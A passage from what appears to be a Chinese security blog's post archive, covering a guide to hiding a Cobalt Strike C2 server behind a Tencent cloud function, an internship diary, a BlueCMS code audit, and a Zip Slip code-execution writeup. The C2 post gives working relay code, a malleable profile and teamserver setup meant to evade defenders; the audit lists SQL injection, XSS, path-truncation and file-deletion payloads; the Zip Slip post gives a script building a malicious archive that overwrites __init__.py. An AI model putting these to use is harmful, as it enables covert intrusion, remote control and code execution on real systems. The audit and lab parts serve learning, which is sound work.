佬出的题整体还是不错的，毕竟我会做的题基本都是他出的，虽说有的知识点确实很偏，有点坐牢，但还是很有意思很有收获的\n","tags":["CTF"]},{"title":"云函数隐藏C2","url":"/2025/07/29/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8FC2/","content":"核心思想核心思想其实很简单，就是用第三方提供的服务接收 C2 客户端的流量，转发给 C2 服务端，避免直接暴露服务端，也可以用加白的域名混淆视听避免蓝队人员发现攻击和反连行为\n   运行木马                                           收到上线包┌─────▼─────┐             ┌─────▼─────┐           ┌──────▼───────┐│  受害主机  │--发送上线包-&gt;│ 国内某公有 |---上线包-&gt;│ Cobalt Strike││           │&lt;-执行命令----│ 函数转发   │&lt;-执行命令-│    服务器     |└───────────┘             └───────────┘           └──────────────┘\n\n第三方服务最好具备以下特点：\n\n国内外访问速度都很快\n国外厂商\n价格便宜（有钱可以忽略）\n主动提供免费加速域名（同上）\n\n云函数配置首先进入腾讯云创建一个自定义函数，运行环境选 python，将下面的代码复制进函数代码中（记得改 C2 地址为我们自己的 C2 地址）\n# coding: utf8import json,requests,base64def main_handler(event, context):    response = &#123;&#125;    path = None    headers = None    try:        C2=&#x27;http://c2ip&#x27;        if&#x27;path&#x27;in event.keys():            path=event[&#x27;path&#x27;]        if&#x27;headers&#x27;in event.keys():                headers=event[&#x27;headers&#x27;]        if&#x27;httpMethod&#x27;in event.keys() and event[&#x27;httpMethod&#x27;] == &#x27;GET&#x27; :            resp=requests.get(C2+path,headers=headers,verify=False)         else:            resp=requests.post(C2+path,data=event[&#x27;body&#x27;],headers=headers,verify=False)            print(resp.headers)            print(resp.content)        response=&#123;            &quot;isBase64Encoded&quot;: True,            &quot;statusCode&quot;: resp.status_code,            &quot;headers&quot;: dict(resp.headers),            &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]        &#125;    except Exception as e:        print(&#x27;error&#x27;)        print(e)    finally:        return response\n\n然后进入触发器中创建一个触发器。选择触发器版本为$LATEST，触发方式为API网关触发，开启集成响应。\n\n然后点击 API 服务名进入 API 网关页面进行配置，这里仅修改路径为&#x2F;就可以，其他配置不用动\n然后点击立即完成，发布任务即可\n\n此时我们便可以使用生成的公网域名中的 http 域名进行上线了\nC2 配置接下来我们要编译一个 CS 的 profile 文件，我们要通过这个文件对我们的包内容进行配置来进行收发包\nset sample_name &quot;func&quot;;set sleeptime &quot;3000&quot;;set jitter    &quot;0&quot;;set maxdns    &quot;255&quot;;set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;http-get &#123;set uri &quot;/api/x&quot;;client &#123;header &quot;Accept&quot; &quot;*/*&quot;;metadata &#123;base64;prepend &quot;SESSIONID=&quot;;header &quot;Cookie&quot;;&#125;&#125;server &#123;header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;header &quot;content-transfer-encoding&quot; &quot;binary&quot;;header &quot;Server&quot; &quot;Nodejs&quot;;output &#123;base64;print;&#125;&#125;&#125;http-stager &#123;set uri_x86 &quot;/vue.min.js&quot;;set uri_x64 &quot;/bootstrap-2.min.js&quot;;&#125;http-post &#123;set uri &quot;/api/y&quot;;client &#123;header &quot;Accept&quot; &quot;*/*&quot;;id &#123;base64;prepend &quot;JSESSION=&quot;;header &quot;Cookie&quot;;&#125;output &#123;    base64;print;&#125;&#125;server &#123;header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;header &quot;content-transfer-encoding&quot; &quot;binary&quot;;header &quot;Connection&quot; &quot;keep-alive&quot;;output &#123;base64;print;&#125;&#125;&#125;\n\nCS 还有一个自带的 c2lint 工具可以帮助我们检验 profile 文件的内容是否正确\n接下来用命令启动 CS\n./teamserver ip passwd xxx.profile\n\n设置监听器，这里要注意端口为80，host为我们刚刚在API网关中的地址，注意需要删除前面的http及后面的:80\n至于防护思路倒是也蛮简单的：\n\n监测疑似 CS 马的攻击流量，例如请求 &#x2F;pixel，&#x2F;__utm.gif，&#x2F;ga.js 等类似 URL 的流量进行重点监测，或者使用微步在线情报识别 CS 马的外联地址\n确认自己资产中是否有某云的云函数的正常业务，没有的话直接把*.apigw.#######cs.com这样的子域名封了就好\n\n","tags":["内网渗透","云安全"]},{"title":"实习随想","url":"/2025/07/27/%E5%AE%9E%E4%B9%A0%E9%9A%8F%E6%83%B3/","content":"为期一个多月的实习也是终于要结束了，暑假的一半时间就这么用在了当牛马的日子了，结束之前还是先复盘一下总结一下收获吧\n首先也是感谢导师给我这么一个机会把我内推进来，本来这个假期是想去护网的，可惜没有去成，不过也是因祸得福有了这么一个实习的机会，虽说圈到的钱是天差地别，但是也没办法\n实习的地方在上海的360安全云（其实是外包），也是第一次来到大城市打拼，也遇到了很多麻烦，但是最终也是想办法解决了\n首先就是工作的内容，虽然来之前我就有了心理预期，又是外包又是实习生，双重 buff 的加持下肯定是没有机会去触碰到核心业务的，但是没想到工作内容这么牛马┭┮﹏┭┮\n工作的内容，说的高大上一点就是为客户提供云上的安全即服务，说的通俗一点就是和蓝初监测组一样，每天就是看看告警然后上报，最多再有个输出报告（ai输出），而且推推上也接入了ai辅助判断告警，可以说是需要点脑子，但是不多。\n但是这段实习总的来说收获还是有的，首先就是更深层次理解了态感的工作原理和部署原理，也了解到了360态感一体机和推推云服务的工作原理（过一两个月可能就忘光了），还有就是了解到了乙方厂商的安全服务的架构和基础建设。还有就是提高了我对流量的研判能力（说实话看流量是真的简单）\n虽然这个工作是纯牛马，还要倒班，但是该说不说，夜班还是非常清闲的，正适合去鼓捣点东西，这个月也是学了不少东西，或许比在学校的3个月加起来还多？在学校学东西的时间倒是真的不是很多，现在回想起来那几个月就打了点靶场，刷了点 CTF 题，倒是台球没少打，下个学期一定不能这么堕落了，必须要每天实验室报道了\n然后就是生活方面遇到的问题，这个问题倒不是很大，但是说实话，刚来上海那几天，这里的物价是真的震惊到我了，随随便便一碗阳春面，什么料都不加就能收8块钱，吃一顿正常的饭就要20起。后来在租房这里有一家江西小炒，以现炒菜的标准来说还是蛮实惠的，总的来说一天的伙食加通勤要50-60左右\n租房这方面，我是和一个学校的舍友一起来实习的，合租也是能省不少钱，因为我们是短租，而且还不是租一个月，是40天，所以几乎不可能去组民房，只能去找公寓（还是试着找了找中介什么的，价格简直阴的没边），但是也是运气好，给我们找到了一个公寓，十几平米上下床，完美符合我们的需求，40天房租加水电大约是2000多一点这样子，经济实惠，可惜不是民水民电。\n总的来说，这次实习的收益其实不是特别大，如果说想学习知识，暑假一个人静下心来学到的东西量是远超实习的，但是实习嘛，一般目的都是冲着对行业前景和行业架构的了解来的，虽说感触也不是很大，但是也是多多少少给我自己提供了一个前进的方向\n然后就是接下来从下个月到年底的计划，现在也只有一个模糊的方向，但是总之先列出来吧\n\n上手打一些偏向实战的靶场\n挖到起码1-2个 edusrc 证书站的证书\n深入一下 java 安全的漏洞（起码要全部复现一遍）\n好好学一下云安全，之前只是过了一遍基础知识，接下来要想办法融入实战了\n下学期的 CTF 要好好打一下，qwb，网鼎杯什么的\n\n明年绝对不干安服了，尽量冲一手实验室吧，实在不行就去干渗透\n","tags":["随笔"]},{"title":"代码审计-Bluecms","url":"/2025/07/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Bluecms/","content":"著名开源 cms，也是有很多漏洞，正好拿来先练个手\n\n用 phpstudy 先随便搭一个出来\n先简单过一下目录结构\nbluecms/├── admin/                     # 后台管理系统│   ├── config.inc.php         # 后台配置文件│   ├── index.php              # 后台登录入口│   ├── main.php               # 后台主界面│   ├── ...                    # 各种管理模块文件│├── api/                     \t # api接口│   ├── index.htm              # 防止目录浏览│   └── uc.php                 # 用户中心接口文件│├── data/                      # 系统数据文件│   ├── config.inc.php         # 全局配置文件│   └── install.lock           # 安装锁│├── images/                    # 图片资源目录│   ├── banner/                # banner 图片│   └── ...                    # 其他图片│├── include/                   # 核心函数、类库等│   ├── db_mysql.class.php     # 数据库操作类│   ├── common.inc.php         # 通用函数│   └── ...                    # 其他类库│├── js/                        # JS 脚本资源│   ├── jquery.js              # jQuery 库│   └── admin.js               # 后台用 JS│├── templates/                 # 前台模板文件│   ├── default/               # 默认模板│   │   ├── header.html│   │   ├── footer.html│   │   └── index.html│   └── ...                    # 其他模板风格│├── uploadfile/               # 上传文件目录（需要可写）│   ├── image/│   └── ...                    # 附件、图片等│├── index.php                  # 首页入口├── search.php                 # 搜索功能├── content.php                # 内容显示页├── list.php                   # 列表页├── install/                   # 安装程序（建议安装后删除）│   ├── index.php│   └── ...└── readme.txt                 # 系统说明\n\n用 Seay 自动审计，然后一个一个去检查\nad_js.php\n这里有 sql 查询语句\n查看一下 common.inc.php 文件的内容\n&lt;?php/** * [bluecms]版权所有 标准网络，保留所有权利 * This is not a freeware, use is subject to license terms * * $Id：common.inc.php * $author：lucks */if(!defined(&#x27;IN_BLUE&#x27;))&#123;\tdie(&#x27;Access Denied!&#x27;);&#125;error_reporting(E_ERROR);define(&#x27;BLUE_ROOT&#x27;,str_replace(&quot;\\\\&quot;,&quot;/&quot;,substr(dirname(__FILE__),0,-7)));define(&#x27;UPLOAD&#x27;,&quot;upload/&quot;);define(&#x27;DATA&#x27;, &quot;data/&quot;);session_cache_limiter(&#x27;private, must-revalidate&#x27;);session_start();require_once(BLUE_ROOT.&#x27;data/config.php&#x27;);define(&#x27;BLUE_PRE&#x27;,$pre);require_once (BLUE_ROOT.&#x27;include/common.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/cat.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/cache.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/user.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/index.fun.php&#x27;);if(!get_magic_quotes_gpc())&#123;\t$_POST = deep_addslashes($_POST);\t$_GET = deep_addslashes($_GET);\t$_COOKIES = deep_addslashes($_COOKIES);\t$_REQUEST = deep_addslashes($_REQUEST);&#125; $timezone = &quot;PRC&quot;;if(PHP_VERSION &gt; &#x27;5.1&#x27;)&#123;\tdate_default_timezone_set($timezone);&#125;$timestamp = time();$online_ip = getip();header(&quot;Content-Type:text/html;charset=&quot;.BLUE_CHARSET);$php_self = isset($_SERVER[&#x27;PHP_SELF&#x27;]) ? $_SERVER[&#x27;PHP_SELF&#x27;] : $_SERVER[&#x27;SCRIPT_NAME&#x27;]; if(isset($_SERVER[&#x27;REQUEST_URI&#x27;])) &#123;\t$url = $_SERVER[&#x27;REQUEST_URI&#x27;];&#125; else &#123;\t$url = $php_self . &quot;?&quot; . $_SERVER[&#x27;QUERY_STRING&#x27;];&#125;require_once(BLUE_ROOT.&#x27;include/mysql.class.php&#x27;);$db = new mysql($dbhost,$dbuser,$dbpass,$dbname);unset($db_host,$db_user,$db_pass,$db_name);require(BLUE_ROOT.&#x27;include/smarty/Smarty.class.php&#x27;);$smarty = new Smarty();$smarty-&gt;caching = false;$smarty-&gt;cache_lifetime = 86400;$smarty-&gt;template_dir = BLUE_ROOT.&#x27;templates/default/&#x27;;$smarty-&gt;compile_dir = BLUE_ROOT.&#x27;data/compile/&#x27;;$smarty-&gt;cache_dir = BLUE_ROOT.&#x27;data/cache/temp_cache/&#x27;;$smarty-&gt;left_delimiter = &quot;&#123;#&quot;;$smarty-&gt;right_delimiter = &quot;#&#125;&quot;;$cache_set = read_static_cache(&#x27;cache_set&#x27;);$_CFG = get_config();if($_CFG[&#x27;isclose&#x27;])&#123;\tif($_CFG[&#x27;reason&#x27;])\t&#123;\t\tshowmsg($_CFG[&#x27;reason&#x27;]);\t&#125;\telse\t&#123;\t\tshowmsg(&#x27;站点暂时关闭...&#x27;);\t&#125;&#125;$banned_ip = get_bannedip();if (@in_array($online_ip, $banned_ip))&#123;\tshowmsg(&#x27;对不起，您的IP已被禁止，有问题请联系管理员!&#x27;);&#125;if(!$_SESSION[&#x27;user_id&#x27;])&#123;\tif($_COOKIE[&#x27;BLUE&#x27;][&#x27;user_id&#x27;] &amp;&amp; $_COOKIE[&#x27;BLUE&#x27;][&#x27;user_name&#x27;] &amp;&amp; $_COOKIE[&#x27;BLUE&#x27;][&#x27;user_pwd&#x27;])\t&#123; \t\tif(check_cookie($_COOKIE[&#x27;BLUE&#x27;][&#x27;user_name&#x27;], $_COOKIE[&#x27;BLUE&#x27;][&#x27;user_pwd&#x27;]))\t\t&#123; \t\t\tupdate_user_info($_COOKIE[&#x27;BLUE&#x27;][&#x27;user_name&#x27;]); \t\t&#125; \t&#125;\telse if($_COOKIE[&#x27;BLUE&#x27;][&#x27;user_name&#x27;])\t&#123;\t\t$user_name = $_COOKIE[&#x27;BLUE&#x27;][&#x27;user_name&#x27;];\t\t$user = $db-&gt;query(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#x27;user&#x27;).&quot; WHERE user_name=&#x27;$user_name&#x27;&quot;);\t\tif($user[&#x27;num&#x27;] == 1)\t\t&#123;\t\t\t$active = 0;\t\t&#125;\t\telse\t\t&#123;\t\t\t$active = 1;\t\t&#125;\t&#125;\telse\t&#123; \t\tsetcookie(&quot;BLUE[user_id]&quot;, &#x27;&#x27;, -86400, $cookiepath, $cookiedomain); \t\tsetcookie(&quot;BLUE[user_name]&quot;, &#x27;&#x27;, -86400, $cookiepath, $cookiedomain); \t\tsetcookie(&quot;BLUE[user_pwd]&quot;, &#x27;&#x27;, -86400, $cookiepath, $cookiedomain); \t&#125;&#125;$smarty-&gt;assign(&#x27;user_name&#x27;, $_SESSION[&#x27;user_name&#x27;]);if ($_CFG[&#x27;gzip&#x27;] == 1 &amp;&amp; function_exists(&#x27;ob_gzhandler&#x27;))&#123;\tob_start(&#x27;ob_gzhandler&#x27;);&#125;else&#123;\tob_start();&#125;?&gt;\n\n（没有注释读起来真的累，关键我 php 都没怎么学过，语法都记不全）\n简单总结就是整个 bluecms 系统的核心初始化文件，主要作用是为每个页面提供公共的环境配置、数据库连接、用户会话、模板引擎等基础功能。\n（话说为什么要管这么多，直接测）\n\n这里看似没有回显，但是其实在源代码中藏有注释\n&lt;!--document.write(&quot;7&quot;);--&gt;\n\n所以 7 是回显位\n-1 union select 1,2,3,4,5,6,database()\n\n能爆出数据库名为 root，证明漏洞存在\n同时这里还可以 xss\n原理是 sql 查询插入非法语句后会回显报错信息，但是这个报错信息中有一段 xss 语句，形成反射性 xss\n\nann.php（看到这个文件名字就想到 anon，没救了属于是）\n\n这里的 sql 语句其实是没有 sql 注入漏洞的，我们来看传参的部分\n$ann_id = !empty($_REQUEST[&#x27;ann_id&#x27;]) ? intval($_REQUEST[&#x27;ann_id&#x27;]) : &#x27;&#x27;;\n\n这里用 intval 对传入的 ann_id 做了强制类型转换，无论用户传入什么内容，最终 ann_id 只会是一个整数，不会包含恶意 sql 语句\n所以下面这里也是同理，不能进行注入\n$db-&gt;query(&quot;UPDATE &quot;.table(&#x27;ann&#x27;).&quot; SET click = click+1 WHERE ann_id = &quot;.$ann_id);\n\ncoment.phpif($type == 1)&#123;\t$db-&gt;query(&quot;UPDATE &quot;.table(&#x27;article&#x27;).&quot; SET comment = comment+1 WHERE id = &quot;.$id);&#125;elseif($type == 0)&#123;\t$db-&gt;query(&quot;UPDATE &quot;.table(&#x27;post&#x27;).&quot; SET comment = comment+1 WHERE post_id = &quot;.$id);&#125;\n\n这里也是同理，参数被 intval 函数包含了\nuser.phpxss\tinclude_once &#x27;include/upload.class.php&#x27;;\t$image = new upload();\t$title = !empty($_POST[&#x27;title&#x27;]) ? htmlspecialchars(trim($_POST[&#x27;title&#x27;])) : &#x27;&#x27;;\t$color = !empty($_POST[&#x27;color&#x27;]) ? htmlspecialchars(trim($_POST[&#x27;color&#x27;])) : &#x27;&#x27;;\t$cid = !empty($_POST[&#x27;cid&#x27;]) ? intval($_POST[&#x27;cid&#x27;]) : &#x27;&#x27;;\tif(empty($cid))&#123;\t\tshowmsg(&#x27;新闻分类不能为空&#x27;);\t&#125;\t$author = !empty($_POST[&#x27;author&#x27;]) ? htmlspecialchars(trim($_POST[&#x27;author&#x27;])) : $_SESSION[&#x27;admin_name&#x27;];\t$source = !empty($_POST[&#x27;source&#x27;]) ? htmlspecialchars(trim($_POST[&#x27;source&#x27;])) : &#x27;&#x27;;$content = !empty($_POST[&#x27;content&#x27;]) ? filter_data($_POST[&#x27;content&#x27;]) : &#x27;&#x27;;$descript = !empty($_POST[&#x27;descript&#x27;]) ? mb_substr($_POST[&#x27;descript&#x27;], 0, 90) : mb_substr(html2text($_POST[&#x27;content&#x27;]),0, 90);\n\n可以注意到，content 是没有被 htmlspecialchars 处理的，或许可以 xss\n跟进到 filter_data：\nfunction filter_data($str)&#123;\t$str = preg_replace(&quot;/&lt;(\\/?)(script|i?frame|meta|link)(\\s*)[^&lt;]*&gt;/&quot;, &quot;&quot;, $str);\treturn $str;&#125;\n\n过滤了常用的xss标签，但仍存在其他的xss标签，如\n&lt;img src=1 onerror=alert(1)&gt;&lt;a href=javascript:alert(1)&gt;&lt;/a&gt;&lt;svg onload=alert(1)&gt;&lt;button onclick=alert(1)&gt;\n\n\n这样就是一个存储型 xss，只要点开这个新闻就会弹窗\n文件包含elseif ($act == &#x27;pay&#x27;)&#123;\tinclude &#x27;data/pay.cache.php&#x27;;\t$price = $_POST[&#x27;price&#x27;];\t$id = $_POST[&#x27;id&#x27;];\t$name = $_POST[&#x27;name&#x27;];\tif (empty($_POST[&#x27;pay&#x27;])) &#123;\t\tshowmsg(&#x27;对不起，您没有选择支付方式&#x27;);\t&#125;\tinclude &#x27;include/payment/&#x27;.$_POST[&#x27;pay&#x27;].&quot;/index.php&quot;;&#125;\n\n这里可能会有一个文件包含，可以配合上传点用图片马 getshell\n这里注意\tinclude ‘include&#x2F;payment&#x2F;‘.$_POST[‘pay’].”&#x2F;index.php”;在后面加了&#x2F;index.php，所以要想办法截断，php5.4 之前的版本可以直接 00 截断，5.4 之后的版本可以利用文件路径长度截断，如用字符.或者&#x2F;.或者.&#x2F;来截断。但是经过尝试后发现只有点截断可行\n复现没截图\n本地文件包含知识点号截断：?file=../../../../../../../../../boot.ini/………[…]…………(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256,y因为在windows下路径超过256个字符后的东西会被舍弃)%00截断:?file=../../../../../../../../../etc/passwd%00(php 版本&lt;= 5.3的才有。例如test.php%00.jpg，这时就会去掉%00后面的字符串。所以程序读取时候就变成了test.php)0x00截断:?file=../../../../../../../../../var/www/%00(需要 magic_quotes_gpc=off，unix 文件系统，比如 FreeBSD，OpenBSD，NetBSD，Solaris)路径长度截断:?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.(php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于 256利用操作系统对目录最大长度的限制，可以不需要 0 字节而达到截断的目的，在 window 下 256 字节、linux 下 4096 字节时会达到最大值，最大值长度之后的字符将被丢弃。而利用 &quot;./&quot; 的方式即可构造出超长目录字符串.)编码绕过:../ -》 %2e%2e%2f -》 ..%2f -》 %2e%2e/..\\ -》 %2e%2e%5c -》 ..%5c -》 %2e%2e(如果服务器对../ 等做一些过滤，可以用一些编码来进行绕过.注:必要情况下可以进行二次编码)\n\n任意文件删除在php中任意删除文件常用于unlink函数，这个函数是删除文件的，可能存在任意文件删除漏洞\nif (!empty($_POST[&#x27;face_pic1&#x27;]))&#123;       if (strpos($_POST[&#x27;face_pic1&#x27;], &#x27;http://&#x27;) != false &amp;&amp; strpos($_POST[&#x27;face_pic1&#x27;], &#x27;https://&#x27;) != false)&#123;          showmsg(&#x27;只支持本站相对路径地址&#x27;);        &#125;       else&#123;          $face_pic = trim($_POST[&#x27;face_pic1&#x27;]);       &#125;   &#125;else&#123;\tif(file_exists(BLUE_ROOT.$_POST[&#x27;face_pic3&#x27;]))&#123;\t\t@unlink(BLUE_ROOT.$_POST[&#x27;face_pic3&#x27;]);\t&#125;&#125;\n\n位置1：user.php-&gt;act&#x3D;edit_user_info ;我们判断处当变量act&#x3D;edit_user_info给user_id和face_pic3一个文件即可尝试是否删除（这里我们文件夹内以一个test.txt文件尝试）删除成功\nguest_book.php&lt;?php/** * [bluecms]版权所有 标准网络，保留所有权利 * This is not a freeware, use is subject to license terms * * $Id：guest_book.php * $author：lucks */define(&#x27;IN_BLUE&#x27;, true);require dirname(__FILE__) . &#x27;/include/common.inc.php&#x27;;$act = !empty($_REQUEST[&#x27;act&#x27;]) ? trim($_REQUEST[&#x27;act&#x27;]) : &#x27;list&#x27;;$ann_cat = $db-&gt;getall(&quot;SELECT * FROM &quot;.table(&#x27;ann_cat&#x27;).&quot; ORDER BY show_order, cid&quot;);if ($act == &#x27;list&#x27;)&#123;\t$guest_total = $db-&gt;getfirst(&quot;SELECT COUNT(*) FROM &quot;.table(&#x27;guest_book&#x27;).&quot; WHERE rid =0&quot;);\tinclude_once BLUE_ROOT.&#x27;include/page.class.php&#x27;;\t$perpage = &#x27;10&#x27;; \t$page = new page(array(&#x27;total&#x27;=&gt;$guest_total, &#x27;perpage&#x27;=&gt;$perpage)); \t$currenpage=$page-&gt;nowindex; \t$offset=($currenpage-1)*$perpage;\t$sql = &quot;SELECT a.*, b.user_name, c.add_time AS reply_time, c.content AS reply_content \t\t\tFROM (&quot; . table(&#x27;guest_book&#x27;).&quot; AS a \t\t\tLEFT JOIN &quot;.table(&#x27;user&#x27;).&quot; AS b \t\t\tON a.user_id = b.user_id) \t\t\tLEFT JOIN &quot; . table(&#x27;guest_book&#x27;).&quot; AS c \t\t\tON a.id = c.rid \t\t\tWHERE a.rid=0 \t\t\tORDER BY id DESC LIMIT $offset, $perpage&quot;;\t$guest_list = $db-&gt;getall($sql);\t\ttemplate_assign(\t\tarray(\t\t\t&#x27;current_act&#x27;,\t\t\t&#x27;cat_nav&#x27;, \t\t\t&#x27;add_nav_list&#x27;, \t\t\t&#x27;bot_nav&#x27;, \t\t\t&#x27;user_name&#x27;,\t\t\t&#x27;url&#x27;,\t\t\t&#x27;guest_list&#x27;,\t\t\t&#x27;guest_total&#x27;,\t\t\t&#x27;page&#x27;,\t\t\t&#x27;page_id&#x27;,\t\t\t&#x27;user_id&#x27;,\t\t\t&#x27;ann_cat&#x27;\t\t),\t\tarray(\t\t\t&#x27;留言列表&#x27;,\t\t\t$cat_nav,\t\t\t$add_nav_list, \t\t\t$bot_nav, \t\t\t$_SESSION[&#x27;user_name&#x27;],\t\t\tbase64_encode($url),\t\t\t$guest_list,\t\t\t$guest_total,\t\t\t$page-&gt;show(3),\t\t\t$currenpage,\t\t\t$_SESSION[&#x27;user_id&#x27;],\t\t\t$ann_cat\t\t)\t);\t$smarty-&gt;display(&#x27;guest_book.htm&#x27;);&#125;elseif ($act == &#x27;send&#x27;)&#123;\t$user_id = $_SESSION[&#x27;user_id&#x27;] ? $_SESSION[&#x27;user_id&#x27;] : 0;\t$rid = intval($_POST[&#x27;rid&#x27;]); \t$content = !empty($_POST[&#x27;content&#x27;]) ? htmlspecialchars($_POST[&#x27;content&#x27;]) : &#x27;&#x27;; \t$content = nl2br($content); \tif(empty($content)) \t&#123; \t\tshowmsg(&#x27;评论内容不能为空&#x27;); \t&#125;\t$sql = &quot;INSERT INTO &quot; . table(&#x27;guest_book&#x27;) . &quot; (id, rid, user_id, add_time, ip, content) \t\t\tVALUES (&#x27;&#x27;, &#x27;$rid&#x27;, &#x27;$user_id&#x27;, &#x27;$timestamp&#x27;, &#x27;$online_ip&#x27;, &#x27;$content&#x27;)&quot;;\t$db-&gt;query($sql);\tshowmsg(&#x27;恭喜您留言成功&#x27;, &#x27;guest_book.php?page_id=&#x27;.$_POST[&#x27;page_id&#x27;]);&#125;elseif ($act == &#x27;del&#x27;)&#123;\t$id = intval($_GET[&#x27;id&#x27;]);\tif (empty($id))\t&#123;\t\treturn false;\t&#125;\tif ($_SESSION[&#x27;user_id&#x27;] != 1) \t&#123;\t\tshowmsg(&#x27;您没有删除此留言的权限&#x27;);\t&#125;\t$db-&gt;query(&quot;DELETE FROM &quot; . table(&#x27;guest_book&#x27;) . &quot; WHERE id=&quot; . $id);\t$db-&gt;query(&quot;DELETE FROM &quot; . table(&#x27;guest_book&#x27;) . &quot; WHERE rid=&quot; . $id);&#125;?&gt;\n\n一个留言板的功能，实测并没有 xss 盲打\n这个简单来说就是这样了，我看网上文章应该还有一个 ssrf，但是我没测出来，还得再练啊┭┮﹏┭┮\n下一个 cms 审哪个呢，大家推荐一下\n","tags":["代码审计"]},{"title":"文件解压之过（Zip Slip）漏洞导致 Python 代码执行","url":"/2025/11/30/%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8E%8B%E4%B9%8B%E8%BF%87%EF%BC%88Zip-Slip%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4-Python-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","content":"Python 中负责解压压缩文件的代码实现上并不安全，存在目录遍历漏洞，攻击者可以利用该漏洞覆盖**__init__.py**文件，实现任意代码执行。\n在PHP中，实现代码执行最为简单的一种方式就是利用PHP中不安全的文件上传处理逻辑。如果你可以欺骗文件上传逻辑，上传任意PHP文件，那么你就可以执行任意PHP代码。\n然而，如果我们面对的是使用Go、Node.js、Python、Ruby等编写的现代Web框架时，即使我们把.py或者.js文件成功上传到服务器上，通过URL请求这些文件通常并不会返回任何结果，即使我们可以通过URL来访问这些资源，也不会触发任何代码执行动作\n但是我们可以通过构造压缩包实现代码执行，精心构造的压缩文件虽然看起来人畜无害，但如果负责解压此类文件的代码本身并不安全，那么这种文件就会带来安全风险。\n首先我们来了解一下 Zip Slip 漏洞  \nZIP 路径穿越漏洞许多应用会从用户上传的 ZIP 压缩包中解压文件。但 ZIP 文件内可以包含 伪造路径，如：\n../../../../tmp/evil.py\n\n如果程序在解压时不验证路径安全性，就可能将这些文件 写到任意路径 —— 例如写到 ~/.bashrc、/var/www/html/、应用目录、配置目录等\n这称为 Zip Slip（路径穿越）漏洞\n→ 当恶意 ZIP 中包含 Python 文件、shell 脚本、配置文件等时，就可能被不慎执行，从而导致 远程代码执行（RCE）\n命令执行示例代码：\ndef unzip(zip_file, extraction_path):    &quot;&quot;&quot;    code to unzip files    &quot;&quot;&quot;    print &quot;[INFO] Unzipping&quot;    try:        files = []        with zipfile.ZipFile(zip_file, &quot;r&quot;) as z:            for fileinfo in z.infolist():                filename = fileinfo.filename                dat = z.open(filename, &quot;r&quot;)                files.append(filename)                outfile = os.path.join(extraction_path, filename)                if not os.path.exists(os.path.dirname(outfile)):                    try:                        os.makedirs(os.path.dirname(outfile))                    except OSError as exc:  # Guard against race condition                        if exc.errno != errno.EEXIST:                            print &quot;n[WARN] OS Error: Race Condition&quot;                if not outfile.endswith(&quot;/&quot;):                    with io.open(outfile, mode=&#x27;wb&#x27;) as f:                        f.write(dat.read())                dat.close()        return files    except Exception as e:        print &quot;[ERROR] Unzipping Error&quot; + str(e)\n\n这段 python 代码非常简单，可以解压 zip 文件并返回归档文件中包含的文件列表。文件上传操作结束后，服务器会收到 zip 文件，然后将 zip 文件发送给 unzip() 进行解压。\noutfile = os.path.join(extraction_path, filename)\n\n通过这一句可以看出来用户可以控制其中的 filename 变量，如果我们把 filename 的值设为../../foo.py，运行结果如下\n&gt;&gt;&gt; import os&gt;&gt;&gt; extraction_path = &quot;/home/kali/webapp/uploads/&quot;&gt;&gt;&gt; filename = &quot;../../foo.py&quot;&gt;&gt;&gt; outfile = os.path.join(extraction_path, filename)&gt;&gt;&gt; outfile&#x27;/home/kali/webapp/uploads/../../foo.py&#x27;&gt;&gt;&gt; open(outfile, &quot;w&quot;).write(&quot;print &#x27;test&#x27;&quot;)&gt;&gt;&gt; open(&quot;/home/kali/foo.py&quot;, &quot;r&quot;).read()&quot;print &#x27;test&#x27;&quot;\n\n利用路径遍历漏洞，我们成功将文件写入了/home/kali目录下\n而实现代码执行，我们需要利用的是 Python 中的__init__.py\nPython 官方文档：\n\n如果某个目录想成为Python中的包，那么该目录中就需要包含__init__.py文件，这样就能避免模块搜索时把目录名为常用字符串（如string）的那些目录包含进来。在最简单的情况下，init.py可以是个空文件，也可以用来执行包中的初始化代码或者设置__all__变量，稍后会继续描述。\n\n假设 Web 应用将某个目录当成 Python 包，如果我们使用任意 Python 代码覆盖该目录中的 init.py 文件，当目标应用导入这个包时，就会执行我们的代码。通常为了顺利执行代码，需要重启服务器，在实战中一般只能被动等待蓝队进行重启操作，但是如果是启用了 dubug 功能的 flask 服务器，只要 Python 文件发生改动，服务器就会重启\n示例 Payloadimport zipfilez_info = zipfile.ZipInfo(r&quot;../config/__init__.py&quot;)z_file = zipfile.ZipFile(&quot;/home/kali/Desktop/bad.zip&quot;, mode=&quot;w&quot;)z_file.writestr(z_info, &quot;print &#x27;test&#x27;&quot;)z_info.external_attr = 0777 &lt;&lt; 16Lz_file.close()\n\n因为主功能文件 server.py 会从 config 目录中导入 settings.py 文件，这意味着如果我们可以将代码写入到config/__init__.py，所以我们最终构造了一个这样的 Payload\nz_info.external_attr = 0777 &lt;&lt; 16L这条语句会将文件权限设为所有人可读可写权限\n上传成功后，Flask 应用就会开始重载，然后服务器上的控制台会打印出“test”字符串\n实战中的利用一个问题就是如果不是 debug 模式下的 flask 服务器，我们要一直等待服务器重启，另一个问题是我们不能每次都知道目标应用使用的包的具体路径，如果目标使用的是开源项目，我们能很轻松的获取其目录信息；如果是闭源应用，我们可以猜测比较常见的包目录，如conf、config、settings、utils、urls、view、tests、scripts、controllers、modules、models、admin、login等。这些包目录经常出现在某些Python Web框架中，如Django、Flask、Pyramid、Tornado、CherryPy、web2py等\n换个思路，如果目标 Web 应用运行在 Ubuntu Linux 